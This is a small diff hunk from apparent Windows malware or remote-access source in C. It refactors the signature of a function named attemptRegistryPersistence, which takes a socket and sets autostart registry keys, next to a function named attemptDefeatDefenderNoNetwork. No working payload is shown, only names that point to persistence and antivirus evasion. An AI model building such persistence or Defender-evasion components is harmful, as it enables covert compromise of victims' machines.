@@ -149,8 +149,8 @@ void attemptDefeatDefenderNoNetwork() {
 }
 
 //Attempts to add autostart to both the local machine and current user keys
-void attemptRegistryPersistence(SOCKET* pSockfd) {
-	TCHAR dirName[100];
+void attemptRegistryPersistence(SOCKET* pSockfd, TCHAR* dirName) {
+
 	DWORD charsWritten;
 	HKEY key;
 	LSTATUS rv;
